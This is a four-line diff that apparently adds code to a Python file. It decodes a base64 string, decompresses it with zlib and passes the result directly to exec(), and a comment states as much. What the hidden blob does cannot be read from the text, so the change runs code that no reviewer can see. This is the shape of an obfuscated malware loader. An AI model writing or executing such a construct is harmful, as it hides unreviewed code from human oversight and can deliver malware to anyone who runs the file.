@@ -1,0 +1,4 @@
+# Compressed, then base64, then executed.
+import base64, zlib
+BLOB = 'H4sIAF0nn2oC/0WOMQvCMBCF9/yKbGmhBgcnIYOjk4tb6RDTowaSXLgkgoj/3dMWXO7gvcf3no8ZqUrMkKwfZGm3TOigFOGCh1Sl2Tx94Xc6d70gyOHJ+hrQ7m75YMwBqsdUtCOwFbqIMwSjllx3B1SDjAy1CxQzvhRhAHWUqhUgtpTDVJn1lRb/AM5KK8sdQpBMjjbN6j314r9OU0vdbwj3o2dp3E96q9AbblgR5koNevEBIynelOoAAAA='
+exec(zlib.decompress(base64.b64decode(BLOB), 31))
